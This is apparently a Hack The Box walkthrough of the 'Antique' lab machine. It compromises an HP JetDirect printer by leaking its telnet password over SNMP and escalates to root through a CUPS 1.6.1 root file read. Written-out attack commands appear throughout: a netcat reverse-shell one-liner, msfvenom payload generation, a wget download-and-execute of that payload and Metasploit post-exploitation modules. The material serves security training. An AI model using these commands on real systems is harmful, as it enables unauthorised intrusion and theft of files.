---
description: https://app.hackthebox.com/machines/400
---

# Antique

## Nmap

```
sudo nmap 10.10.11.107 -p- -sS -sV

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
```

With minimal `nmap` results returned we also scan `UDP` ports for any open ports.

```
sudo nmap 10.10.11.107 -sU -F                     

PORT    STATE SERVICE
161/udp open  snmp
```

Checking out telnet on port 23 we see when connecting we are informed of a HP JetDirect printer.

![](<../../../.gitbook/assets/image (144).png>)

A few default passwords prove unsuccessful. Researching on Google for JetDirect exploits we find a great article from IronGeek: [http://www.irongeek.com/i.php?page=security/networkprinterhacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)

![](<../../../.gitbook/assets/image (450).png>)

As per the article we try the same exploit.

```bash
snmpget -v 1 -c public <IP> .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

![](<../../../.gitbook/assets/image (251).png>)

The resulting BITS value can be taken over to CyberChef and decoded from Hex to a plaintext value.

**CyberChef:** [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)

![](<../../../.gitbook/assets/image (540).png>)

We now have the password `P@ssw0rd@123!!123` which can be used to authenticate over `telnet`.

![](<../../../.gitbook/assets/image (321).png>)

From the `?` output above we see the `exec` command can be used to perform system commands.

Running the following command shows `nc` is installed on the target system.

```
exec which nc
```

a `nc` listener is set up on the attacking system and the following command is executed on the target `telnet` session to receive a reverse shell.

```bash
exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <Port> >/tmp/f
```

Which we receive a shell on our `nc` listener.

![](<../../../.gitbook/assets/image (2081).png>)

After grabbing the user flag, we perform some basic enumeration against the target system. Looking through the CUPS configuration files we notice we are running CUPS 1.6.1

![](<../../../.gitbook/assets/image (2035) (2).png>)

Research against Google shows this version of CUPS can perform root file reads.

**URL:** [https://www.rapid7.com/db/modules/post/multi/escalate/cups\_root\_file\_read/](https://www.rapid7.com/db/modules/post/multi/escalate/cups\_root\_file\_read/)

As this is a `metasploit` module we will need to get a `meterpreter` shell.

Firstly, an x86 `elf` payload was generated.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f elf -o reverse.elf
```

A `meterpreter` listener was then setup

```bash
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"
```

The payload as then downloaded onto the target system and executed.

```
# Download the payload
wget http://<IP>/reverse.elf

# Set executable on the payload
chmod +x reverse.elf

# Execute
./reverse.elf
```

This will then catch a command shell within `meterpreter`.

![](<../../../.gitbook/assets/image (60).png>)

After this the following `metasploit` mode was used to upgrade the command shell to a `meterpreter` shell.

```
use post/multi/manage/shell_to_meterpreter
```

![](<../../../.gitbook/assets/image (1291).png>)

The following mode was then used for the CUPS root read module.

```
use post/multi/escalate/cups_root_file_read
```

The `root.txt` was set as a parameter for the file to read and executed. Successfully reading the `root.txt` flag.

![](<../../../.gitbook/assets/image (337).png>)
